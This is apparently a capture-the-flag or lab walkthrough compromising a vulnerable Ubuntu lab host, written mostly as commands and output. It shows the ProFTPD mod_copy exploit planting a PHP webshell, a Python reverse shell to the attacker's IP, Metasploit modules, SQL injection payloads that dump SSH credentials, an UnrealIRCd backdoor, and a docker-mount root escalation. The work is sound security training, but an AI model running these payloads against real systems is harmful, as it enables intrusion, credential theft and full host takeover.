# Recon
## Initial Scanning

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -p- -vvv --min-rate 10000 192.168.1.13                       
---- snip ----
Nmap scan report for 192.168.1.13
Host is up, received arp-response (0.013s latency).
Scanned at 2026-01-27 20:13:56 EST for 20s
Not shown: 65525 filtered tcp ports (no-response)
PORT     STATE  SERVICE      REASON
21/tcp   open   ftp          syn-ack ttl 64
22/tcp   open   ssh          syn-ack ttl 64
80/tcp   open   http         syn-ack ttl 64
445/tcp  open   microsoft-ds syn-ack ttl 64
631/tcp  open   ipp          syn-ack ttl 64
3000/tcp closed ppp          reset ttl 64
3306/tcp open   mysql        syn-ack ttl 64
3500/tcp open   rtmp-port    syn-ack ttl 64
6697/tcp open   ircs-u       syn-ack ttl 64
8181/tcp open   intermapper  syn-ack ttl 64
MAC Address: 3C:F8:62:5C:62:A5 (Intel Corporate)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.67 seconds
           Raw packets sent: 196603 (8.651MB) | Rcvd: 23 (964B)
           
┌──(kali㉿kali)-[~]
└─$ nmap -sCV -p 21,22,80,445,631,3306,3500,6697,8181 -oN scan.txt 192.168.1.13    
Nmap scan report for 192.168.1.13
Host is up (0.034s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 b4:a3:42:bd:e5:15:25:d7:09:a8:98:db:d3:50:4d:0a (DSA)
|   2048 76:e5:15:15:e2:dc:9b:87:8c:43:ab:83:0a:4f:60:fa (RSA)
|   256 98:3f:71:a8:e7:55:70:7f:ca:22:07:50:03:35:79:f0 (ECDSA)
|_  256 5c:0d:ee:31:58:7e:bc:00:a8:c2:01:9c:55:d7:e5:69 (ED25519)
80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-title: Index of /
|_http-server-header: Apache/2.4.7 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-07-29 13:46  chat/
| -     2011-07-27 20:17  drupal/
| 1.7K  2018-07-29 13:46  payroll_app.php
| -     2013-04-08 12:06  phpmyadmin/
| 5.4K  2026-01-26 02:10  webshell.php
|_
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
631/tcp  open  ipp         CUPS 1.7
| http-methods: 
|_  Potentially risky methods: PUT
|_http-server-header: CUPS/1.7 IPP/2.1
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Home - CUPS 1.7.2
3306/tcp open  mysql       MySQL (unauthorized)
3500/tcp open  http        WEBrick httpd 1.3.1 (Ruby 2.3.7 (2018-03-28))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Ruby on Rails: Welcome aboard
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.7/2018-03-28)
6697/tcp open  irc         UnrealIRCd
8181/tcp open  http        WEBrick httpd 1.3.1 (Ruby 2.3.7 (2018-03-28))
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.7/2018-03-28)
|_http-title: Site doesnt have a title (text/html;charset=utf-8).
MAC Address: 3C:F8:62:5C:62:A5 (Intel Corporate)
Service Info: Hosts: UBUNTU, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-01-28T01:27:44
|_  start_date: N/A
|_clock-skew: mean: 2s, deviation: 4s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: ubuntu
|   NetBIOS computer name: UBUNTU\x00
|   Domain name: \x00
|   FQDN: ubuntu
|_  System time: 2026-01-28T01:27:48+00:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.11 seconds


```
## Samba server - TCP 445

## Tech Stack

- Detecting HTTP Responses
```bash
curl -I http://192.168.1.13
HTTP/1.1 200 OK
Date: Wed, 28 Jan 2026 01:34:56 GMT
Server: Apache/2.4.7 (Ubuntu)
Content-Type: text/html;charset=UTF-8

```

- Image from Wappalyzer
 ![[images/Pasted image 20260128084126.png]]
***

# Shell as FTP (ProFTPD 1.3.5)

- So, the vulnerability is on port 21. By accessing this port, it was identified that **ProFTPD 1.3.5** contains a remote code execution (RCE) vulnerability via the mod_copy module, which allows attackers to execute code on the server, as demonstrated below
## Manual Exploitation

First, connect to the port via the telnet **10.0.2.6 21** tool which it’s a **command-line interface** for communicating with remote devices or servers over a **TCP/IP network** and then **site `cpfr /etc/passwd**`

- **SITE**: Initiates a server-specific command.
- **CPFR:** Indicates the file to copy from (in this case, ****`/etc/passwd`).

So the structure of the command will be like this  SITE CPTO /path/to/destination, site CPTO /var/www/html/pwn.txt to overwrite the pwn.txt file
```bash
# printf "USER anonymous\r\nPASS anonymous\r\nSITE CPFR /etc/passwd\r\nSITE CPTO /tmp/pwn\r\n" | nc 192.168.1.13 21

┌──(kali㉿kali)-[~]
└─$ nc 192.168.1.13 21                                                
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.1.13]
help
214-The following commands are recognized (* =>'s unimplemented):
 CWD     XCWD    CDUP    XCUP    SMNT*   QUIT    PORT    PASV    
 EPRT    EPSV    ALLO*   RNFR    RNTO    DELE    MDTM    RMD     
 XRMD    MKD     XMKD    PWD     XPWD    SIZE    SYST    HELP    
 NOOP    FEAT    OPTS    AUTH*   CCC*    CONF*   ENC*    MIC*    
 PBSZ*   PROT*   TYPE    STRU    MODE    RETR    STOR    STOU    
 APPE    REST    ABOR    USER    PASS    ACCT*   REIN*   LIST    
 NLST    STAT    SITE    MLSD    MLST    
214 Direct comments to root@localhost
SITE CPFR /etc/passwd
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/pwn.txt
250 Copy successful

```

The **test.php** has been overwritten with the content of the ****`/etc/passwd`** file

```bash
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.1.13/pwn.txt     
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
sshd:x:103:65534::/var/run/sshd:/usr/sbin/nologin
statd:x:104:65534::/var/lib/nfs:/bin/false
vagrant:x:900:900:vagrant,,,:/home/vagrant:/bin/bash
leia_organa:x:1111:100::/home/leia_organa:/bin/bash
luke_skywalker:x:1112:100::/home/luke_skywalker:/bin/bash
han_solo:x:1113:100::/home/han_solo:/bin/bash
artoo_detoo:x:1114:100::/home/artoo_detoo:/bin/bash
c_three_pio:x:1115:100::/home/c_three_pio:/bin/bash
ben_kenobi:x:1116:100::/home/ben_kenobi:/bin/bash
darth_vader:x:1117:100::/home/darth_vader:/bin/bash
anakin_skywalker:x:1118:100::/home/anakin_skywalker:/bin/bash
jarjar_binks:x:1119:100::/home/jarjar_binks:/bin/bash
lando_calrissian:x:1120:100::/home/lando_calrissian:/bin/bash
boba_fett:x:1121:100::/home/boba_fett:/bin/bash
jabba_hutt:x:1122:100::/home/jabba_hutt:/bin/bash
greedo:x:1123:100::/home/greedo:/bin/bash
chewbacca:x:1124:100::/home/chewbacca:/bin/bash
kylo_ren:x:1125:100::/home/kylo_ren:/bin/bash
mysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false
avahi:x:106:113:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
colord:x:107:115:colord colour management daemon,,,:/var/lib/colord:/bin/false

```

- Exploit

```bash
┌──(kali㉿kali)-[~]
└─$ nc 192.168.1.13 21
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [192.168.1.13]
SITE CPFR /proc/self/cmdline
350 File or directory exists, ready for destination name
SITE CPTO /tmp/<?php system($_GET['c']) ?>
250 Copy successful
SITE CPFR /tmp/<?php system($_GET['c']) ?>
350 File or directory exists, ready for destination name
SITE CPTO /var/www/html/anything.php    
250 Copy successful
421 Login timeout (300 seconds): closing control connection

# Test
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.1.13/anything.php?c=id
proftpd: 192.168.1.8:48798: SITE CPTO /tmp/uid=33(www-data) gid=33(www-data) groups=33(www-data)
#                                           
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.1.13/anything.php?c=whoami
proftpd: 192.168.1.8:48798: SITE CPTO /tmp/www-data                                                                                         
#                      
┌──(kali㉿kali)-[~]
└─$ curl http://192.168.1.13/anything.php?c=uname -a
proftpd: 192.168.1.8:48798: SITE CPTO /tmp/Linux

# call webshell
─(kali㉿kali)-[~]
└─$ curl "http://192.168.1.13/anything.php?c=python%20-c%20'import%20os%2Csocket%3Bs%3Dsocket.socket()%3Bs.connect((%22192.168.1.8%22%2C9001))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bos.system(%22/bin/sh%22)'"

# Listen on port 9001
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 9001                                                                                              
listening on [any] 9001 ...
connect to [192.168.1.8] from (UNKNOWN) [192.168.1.13] 39384
whoami
www-data
pwd
/var/www/html


```

 - payload:
 
 ```bash
 python -c 'import os, socket;s=socket.socket();s.connect((\"192.168.229.30\", 9001));os.dup2(s.fileno(), 0);os.dup2(s.fileno(), 1);os.dup2(s.fileno(), 2);os.system(\"/bin/sh\")'
 ```
 ***
 
 
## With the Metasploit

```bash
msf > search ProFTPD 1.3.5

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/unix/ftp/proftpd_modcopy_exec  2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/proftpd_modcopy_exec

msf > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf exploit(unix/ftp/proftpd_modcopy_exec) > set RHOSTS 192.168.1.13
RHOSTS => 192.168.1.13
msf exploit(unix/ftp/proftpd_modcopy_exec) > set SITEPATH /var/www/html
SITEPATH => /var/www/html
msf exploit(unix/ftp/proftpd_modcopy_exec) > set payload payload/cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf exploit(unix/ftp/proftpd_modcopy_exec) > run
[*] Started reverse TCP handler on 192.168.1.8:4444 
[*] 192.168.1.13:80 - 192.168.1.13:21 - Connected to FTP server
[*] 192.168.1.13:80 - 192.168.1.13:21 - Sending copy commands to FTP server
[*] 192.168.1.13:80 - Executing PHP payload /JUAQHca.php
[+] 192.168.1.13:80 - Deleted /var/www/html/JUAQHca.php
[*] Command shell session 1 opened (192.168.1.8:4444 -> 192.168.1.13:46835) at 2026-01-28 01:57:48 -0500

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data

```
***

# Shell as Port 80: webpage

## Drupal webpage

- after running the directory fuzzing

```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -u http://192.168.1.13/drupal/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt,.bak,.old,.zip -t 20 -mc 200,301,302 -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.1.13/drupal/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt .bak .old .zip 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 20
 :: Matcher          : Response status: 200,301,302
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 9772, Words: 943, Lines: 177, Duration: 2455ms]
includes                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 11ms]
index.php               [Status: 200, Size: 9772, Words: 943, Lines: 177, Duration: 245ms]
index.php               [Status: 200, Size: 9772, Words: 943, Lines: 177, Duration: 324ms]
install.php             [Status: 200, Size: 3072, Words: 184, Lines: 51, Duration: 353ms]
LICENSE.txt             [Status: 200, Size: 14940, Words: 2349, Lines: 275, Duration: 36ms]
misc                    [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 9ms]
modules                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 8ms]
profiles                [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 7ms]
README.txt              [Status: 200, Size: 3494, Words: 458, Lines: 89, Duration: 30ms]
robots.txt              [Status: 200, Size: 1531, Words: 127, Lines: 60, Duration: 10ms]
robots.txt              [Status: 200, Size: 1531, Words: 127, Lines: 60, Duration: 13ms]
scripts                 [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 9ms]
sites                   [Status: 301, Size: 318, Words: 20, Lines: 10, Duration: 5ms]
themes                  [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 9ms]
web.config              [Status: 200, Size: 2051, Words: 380, Lines: 44, Duration: 17ms]
xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1, Duration: 201ms]
xmlrpc.php              [Status: 200, Size: 42, Words: 6, Lines: 1, Duration: 206ms]
:: Progress: [27684/27684] :: Job [1/1] :: 877 req/sec :: Duration: [0:00:16] :: Errors: 0 ::

```

- file that contains the version of Drupal
![[Pasted image 20260128141223.png]]

- I've tried all the modules related to this version but haven't gotten the expected results. because when i have tried Nmap scanning it was the version before 7.5  it was vulnerable to CVE-2014-3704 which affected only versions before 7.32.

```bash
┌──(kali㉿kali)-[~]
└─$ nmap --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal/"  -p 80 192.168.1.13
Nmap scan report for 192.168.1.13
Host is up (0.081s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-vuln-cve2014-3704: 
|   VULNERABLE:
|   Drupal - pre Auth SQL Injection Vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-3704
|         The expandArguments function in the database abstraction API in
|         Drupal core 7.x before 7.32 does not properly construct prepared
|         statements, which allows remote attackers to conduct SQL injection
|         attacks via an array containing crafted keys.
|           
|     Disclosure date: 2014-10-15
|     Exploit results:
|        Linux ubuntu 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
|   
|     References:
|       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704
|       http://www.securityfocus.com/bid/70595
|_      https://www.drupal.org/SA-CORE-2014-005
MAC Address: 3C:F8:62:5C:62:A5 (Intel Corporate)

Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds

```

With The Metasploit, I have here found the drupageddon module for this CVE

![[Screenshot 2026-01-28 at 14.19.47.png]]

After running the exploit we got the shell as below picture

![[Pasted image 20260128142446.png]]
***

## Payroll_app
**Payroll** has **SQL injection vulnerability type** **UNION SQL injection** in the login page

![[Pasted image 20260128144303.png]]

- Using SQL injection get DB + Table

```bash
# get DB 
' UNION SELECT null,null,schema_name,null FROM information_schema.schemata-- -'
## DB: payroll

# get table
' UNION SELECT null,null,table_name,null FROM information_schema.tables WHERE table_schema='payroll'-- -

```

- SQL Injection: `OR 1=1 UNION SELECT null,null,username,password FROM users#`

![[Pasted image 20260128145100.png]]

- Login in with SSH: `leia_organa:help_me_obiwan`
```bash
ssh leia_organa@192.168.1.13                        
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
leia_organa@192.168.1.13's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '16.04.7 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Mon Jan 26 01:34:53 2026 from 192.168.1.8
-bash-4.3$ id
uid=1111(leia_organa) gid=100(users) groups=100(users),27(sudo)
-bash-4.3$ 

```

# Shell as Unreal IRC Service 6697
- Identify the Unreal IRC version: 

![[Pasted image 20260128151506.png]]
- unreal ircd 3.2.8.1. When we search Google for the version number we quickly find that this version may contain a backdoor:
- https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/.
- Use this payload to exploit the vulnerability: https://github.com/Ranger11Danger/UnrealIRCd-3.2.8.1-Backdoor

- Use payloads with Python options.

![[Pasted image 20260128153011.png]]

- And then a shell at `nc`:

![[Pasted image 20260128153041.png]]

***
# Privilege Escalation
## Privilege Escalation with docker.

After the reverse shell, we now have a stable shell and boba_fett is one of the docker groups which means it has access on docker without having to be in the the sudo group.

![[Pasted image 20260128160511.png]]

So, running docker images to list the installed images was Ubuntu one of the installed images which make the escalation a pace of cake.

![[Pasted image 20260128160641.png]]


`docker run -v /:/mnt –rm -it ubuntu chroot /mnt /bin/bash` by Mounting / in the Docker container and using `chroot` to give the full root access to the host system, allowing to write on the host files.

![[Pasted image 20260128160931.png]]

Setting /bin/bash to sets the SUID by chomd u+s /bin/bash to run it as a root.

![[Pasted image 20260128161047.png]]

After running it with the -p option to enable privileged mode and prevent dropping permissions, we now have the effective user ID (EUID) of root,
![[Pasted image 20260128161407.png]]